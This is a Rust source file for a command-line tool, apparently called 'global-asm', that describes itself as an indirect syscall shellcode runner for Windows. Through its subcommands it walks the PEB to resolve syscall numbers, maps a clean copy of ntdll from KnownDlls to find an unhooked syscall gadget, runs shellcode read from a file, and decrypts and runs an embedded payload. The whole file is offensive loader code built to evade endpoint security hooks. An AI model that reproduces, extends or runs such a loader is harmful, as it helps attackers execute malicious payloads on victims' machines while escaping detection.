use global_asm::{clean, payload, syscall};

#[cfg(all(windows, target_arch = "x86_64"))]
use global_asm::smoke;

use std::process::ExitCode;

fn main() -> ExitCode {
    let mut args = std::env::args().skip(1);
    let cmd = args.next().unwrap_or_else(|| "help".to_string());
    match cmd.as_str() {
        "resolve" => diagnostics(),
        "map" => map_clean(),
        "smoke" => smoke(),
        "exec" => match args.next() {
            Some(path) => exec_file(&path),
            None => {
                eprintln!("usage: global-asm exec <shellcode-file>");
                ExitCode::from(2)
            }
        },
        "run" => {
            payload::run();
            ExitCode::SUCCESS
        }
        "help" | "-h" | "--help" => {
            usage();
            ExitCode::SUCCESS
        }
        other => {
            eprintln!("unknown subcommand: {other}\n");
            usage();
            ExitCode::from(2)
        }
    }
}

fn usage() {
    println!(
        "global-asm — indirect syscall shellcode runner\n\n\
         USAGE:\n  \
         global-asm <subcommand>\n\n\
         SUBCOMMANDS:\n  \
         resolve         PEB walk + export/SSN diagnostics (no execution)\n  \
         map             map \\KnownDlls\\ntdll.dll and report the clean gadget\n  \
         smoke           run the harmless built-in payload end-to-end\n  \
         exec <file>     run shellcode from <file>\n  \
         run             decrypt and run the embedded payload\n  \
         help            show this text"
    );
}

fn diagnostics() -> ExitCode {
    #[cfg(all(windows, target_arch = "x86_64"))]
    unsafe {
        match syscall::resolve_targets() {
            Ok(t) => {
                println!("[+] ntdll base        : {:#018x}", t.ntdll_base);
                println!(
                    "[+] NtAllocateVM      : {:#018x}  SSN {:#06x}",
                    t.nt_allocate, t.ssn_allocate
                );
                println!(
                    "[+] NtProtectVM       : {:#018x}  SSN {:#06x}",
                    t.nt_protect, t.ssn_protect
                );
                if t.nt_free != 0 {
                    println!(
                        "[+] NtFreeVirtualMem  : {:#018x}  SSN {:#06x}",
                        t.nt_free, t.ssn_free
                    );
                } else {
                    println!("[+] NtFreeVirtualMem  : <not resolved>");
                }
                println!("[+] syscall gadget    : {:#018x}", t.gadget);
                ExitCode::SUCCESS
            }
            Err(e) => {
                eprintln!("[!] {e}");
                ExitCode::FAILURE
            }
        }
    }
    #[cfg(not(all(windows, target_arch = "x86_64")))]
    {
        eprintln!("[!] the syscall path is only available on x86_64 Windows");
        ExitCode::FAILURE
    }
}

fn map_clean() -> ExitCode {
    #[cfg(all(windows, target_arch = "x86_64"))]
    unsafe {
        let t = match syscall::resolve_targets() {
            Ok(t) => t,
            Err(e) => {
                eprintln!("[!] {e}");
                return ExitCode::FAILURE;
            }
        };
        match clean::map_clean_ntdll(&t) {
            Some(m) => {
                println!("[+] clean ntdll base  : {:#018x}", m.base);
                println!("[+] clean view size   : {:#x}", m.size);
                println!("[+] clean gadget      : {:#018x}", m.gadget);
                m.release();
                ExitCode::SUCCESS
            }
            None => {
                eprintln!(
                    "[!] could not map \\KnownDlls\\ntdll.dll (falling back to loaded ntdll)"
                );
                ExitCode::FAILURE
            }
        }
    }
    #[cfg(not(all(windows, target_arch = "x86_64")))]
    {
        eprintln!("[!] clean ntdll mapping is only available on x86_64 Windows");
        ExitCode::FAILURE
    }
}

fn smoke() -> ExitCode {
    #[cfg(all(windows, target_arch = "x86_64"))]
    unsafe {
        println!("[*] running harmless shellcode through the indirect path...");
        match smoke::run_shellcode_smoke() {
            Ok(()) => println!("[+] shellcode ran and returned cleanly"),
            Err(e) => {
                eprintln!("[!] smoke payload failed: {e}");
                return ExitCode::FAILURE;
            }
        }
        println!("[*] terminating via ExitProcess(0x1337) through the PEB/export resolver");
        println!("    (expected process exit code: 4919 / 0x1337)");
        smoke::exitprocess_via_resolver(0x1337);
    }
    #[cfg(not(all(windows, target_arch = "x86_64")))]
    {
        eprintln!("[!] smoke test is only available on x86_64 Windows");
        ExitCode::FAILURE
    }
}

fn exec_file(path: &str) -> ExitCode {
    let code = match std::fs::read(path) {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[!] cannot read {path}: {e}");
            return ExitCode::from(2);
        }
    };
    println!("[*] {} bytes of shellcode from {}", code.len(), path);
    #[cfg(all(windows, target_arch = "x86_64"))]
    unsafe {
        match syscall::exec(&code) {
            Ok(()) => {
                println!("[+] payload executed and returned");
                ExitCode::SUCCESS
            }
            Err(e) => {
                eprintln!("[!] {e}");
                ExitCode::FAILURE
            }
        }
    }
    #[cfg(not(all(windows, target_arch = "x86_64")))]
    {
        eprintln!("[!] execution is only available on x86_64 Windows");
        ExitCode::FAILURE
    }
}
